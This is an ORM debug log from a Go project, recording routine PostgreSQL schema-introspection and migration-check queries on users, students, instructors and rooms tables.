[0m[33m[12.702ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[15.431ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.638ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'users'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.118ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.209ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.191ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.167ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.182ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'user_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.260ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'first_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.876ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'last_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.431ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'middle_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.267ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.474ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.272ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'password') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.336ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.156ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.377ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.941ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'users' AND indexname = 'idx_users_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.715ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND table_type = 'BASE TABLE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.409ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.070ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'students'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.685ms] [34;1m[rows:-][0m SELECT * FROM "students" LIMIT 5

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[6.185ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'students' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[7.079ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'students'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.652ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'students'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.142ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.132ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.405ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.120ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.305ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'is_premiem') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.306ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'user_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.862ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND constraint_name = 'fk_students_user'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.868ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'students' AND indexname = 'idx_students_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.817ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'students' AND indexname = 'idx_student_user' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.772ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND table_type = 'BASE TABLE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.365ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.108ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'instructors'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.557ms] [34;1m[rows:-][0m SELECT * FROM "instructors" LIMIT 5

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[6.003ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'instructors' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[7.313ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'instructors'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.542ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'instructors'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.319ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.143ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.245ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.113ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.220ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'account_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.104ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND column_name = 'user_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'instructors' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.865ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'instructors' AND constraint_name = 'fk_instructors_user'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.849ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'instructors' AND indexname = 'idx_instructors_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.863ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'instructors' AND indexname = 'idx_instructor_user' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.661ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND table_type = 'BASE TABLE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.380ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.353ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'rooms'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.893ms] [34;1m[rows:-][0m SELECT * FROM "rooms" LIMIT 5

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[7.870ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'rooms' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[8.549ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'rooms'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.573ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'rooms'

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.719ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'rooms' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'rooms' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:44 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
